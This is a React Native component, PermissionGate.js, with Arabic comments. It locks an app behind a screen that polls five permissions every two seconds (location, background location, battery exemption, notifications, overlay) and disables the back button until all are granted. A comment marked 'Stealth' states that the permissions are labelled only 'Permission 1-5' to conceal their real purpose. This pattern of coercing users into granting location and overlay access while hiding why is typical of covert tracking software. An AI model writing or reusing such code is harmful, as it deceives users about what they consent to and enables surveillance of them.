/**
   * PermissionGate.js — v2.7.12
   *
   * شاشة قفل تفحص الصلاحيات الـ 5 المطلوبة كل ثانيتين.
   * - إذا كل الصلاحيات مفعّلة → يستدعي onAllGranted() ويختفي.
   * - إذا واحدة ناقصة → يعرض الشاشة، Back معطّل، ما يقدر يطلع إلا بالخروج التام.
   * - بعد رجوع المستخدم من الإعدادات (AppState active) → يعيد الفحص فوراً.
   *
   * ملاحظة Stealth: الأسماء "صلاحية 1, 2, 3, 4, 5" بدون كشف الغرض الحقيقي.
   */

  import React, { useEffect, useState, useRef, useCallback } from 'react';
  import {
    View, Text, TouchableOpacity, StyleSheet, BackHandler,
    AppState, Alert, ActivityIndicator,
  } from 'react-native';
  import {
    checkAllPermissions,
    requestPermission1_Location,
    requestPermission2_BackgroundLocation,
    requestPermission3_Battery,
    requestPermission4_Notifications,
    requestPermission5_Overlay,
  } from '../services/PermissionsHelper';

  const POLL_INTERVAL_MS = 2000;

  export default function PermissionGate({ children }) {
    const [state, setState] = useState({ p1: false, p2: false, p3: false, p4: false, p5: false, allGranted: false });
    const [loading, setLoading] = useState(true);
    const intervalRef = useRef(null);
    const appStateRef = useRef(AppState.currentState);

    const refresh = useCallback(async () => {
      const result = await checkAllPermissions();
      setState(result);
      if (loading) setLoading(false);
      return result;
    }, [loading]);

    // الفحص الأول + interval كل ثانيتين
    useEffect(() => {
      refresh();
      intervalRef.current = setInterval(refresh, POLL_INTERVAL_MS);
      return () => {
        if (intervalRef.current) clearInterval(intervalRef.current);
      };
    }, [refresh]);

    // فحص فوري لما المستخدم يرجع من إعدادات النظام
    useEffect(() => {
      const sub = AppState.addEventListener('change', (next) => {
        if (appStateRef.current.match(/inactive|background/) && next === 'active') {
          refresh();
        }
        appStateRef.current = next;
      });
      return () => sub.remove();
    }, [refresh]);

    // Back معطّل أثناء عرض الشاشة
    useEffect(() => {
      if (state.allGranted) return;
      const sub = BackHandler.addEventListener('hardwareBackPress', () => {
        Alert.alert(
          'تنبيه',
          'بدون تفعيل جميع الصلاحيات لا يعمل التطبيق.',
          [
            { text: 'متابعة', style: 'cancel' },
            { text: 'خروج', style: 'destructive', onPress: () => BackHandler.exitApp() },
          ],
          { cancelable: false }
        );
        return true; // block default back
      });
      return () => sub.remove();
    }, [state.allGranted]);

    // إذا الكل ✅ → نخفي الشاشة ونعرض التطبيق
    if (state.allGranted) {
      return children;
    }

    if (loading) {
      return (
        <View style={styles.loadingContainer}>
          <ActivityIndicator size="large" color="#FFC107" />
        </View>
      );
    }

    const items = [
      { key: 'p1', label: 'صلاحية 1', granted: state.p1, onPress: requestPermission1_Location },
      { key: 'p2', label: 'صلاحية 2', granted: state.p2, onPress: requestPermission2_BackgroundLocation },
      { key: 'p3', label: 'صلاحية 3', granted: state.p3, onPress: requestPermission3_Battery },
      { key: 'p4', label: 'صلاحية 4', granted: state.p4, onPress: requestPermission4_Notifications },
      { key: 'p5', label: 'صلاحية 5', granted: state.p5, onPress: requestPermission5_Overlay },
    ];

    return (
      <View style={styles.container}>
        <Text style={styles.title}>لتشغيل التطبيق</Text>
        <Text style={styles.subtitle}>فعّل الصلاحيات التالية:</Text>

        <View style={styles.list}>
          {items.map((item) => (
            <View key={item.key} style={styles.row}>
              <Text style={styles.statusIcon}>{item.granted ? '✅' : '❌'}</Text>
              <Text style={styles.label}>{item.label}</Text>
              {item.granted ? (
                <View style={styles.doneBadge}>
                  <Text style={styles.doneText}>تم</Text>
                </View>
              ) : (
                <TouchableOpacity
                  style={styles.actionBtn}
                  onPress={() => item.onPress()}
                  activeOpacity={0.7}
                >
                  <Text style={styles.actionText}>تفعيل</Text>
                </TouchableOpacity>
              )}
            </View>
          ))}
        </View>
      </View>
    );
  }

  const styles = StyleSheet.create({
    loadingContainer: { flex: 1, justifyContent: 'center', alignItems: 'center', backgroundColor: '#fff' },
    container: {
      flex: 1, backgroundColor: '#fff', padding: 24, justifyContent: 'center',
    },
    title: { fontSize: 26, fontWeight: 'bold', textAlign: 'center', color: '#222', marginBottom: 8 },
    subtitle: { fontSize: 16, textAlign: 'center', color: '#666', marginBottom: 32 },
    list: { backgroundColor: '#fafafa', borderRadius: 12, padding: 8 },
    row: {
      flexDirection: 'row-reverse', alignItems: 'center',
      paddingVertical: 14, paddingHorizontal: 12,
      borderBottomWidth: 1, borderBottomColor: '#eee',
    },
    statusIcon: { fontSize: 20, marginLeft: 12 },
    label: { flex: 1, fontSize: 18, color: '#333', textAlign: 'right' },
    actionBtn: {
      backgroundColor: '#FFC107', paddingVertical: 8, paddingHorizontal: 20, borderRadius: 8,
    },
    actionText: { color: '#000', fontSize: 15, fontWeight: 'bold' },
    doneBadge: {
      backgroundColor: '#e8f5e9', paddingVertical: 8, paddingHorizontal: 20, borderRadius: 8,
    },
    doneText: { color: '#2e7d32', fontSize: 15, fontWeight: 'bold' },
  });
  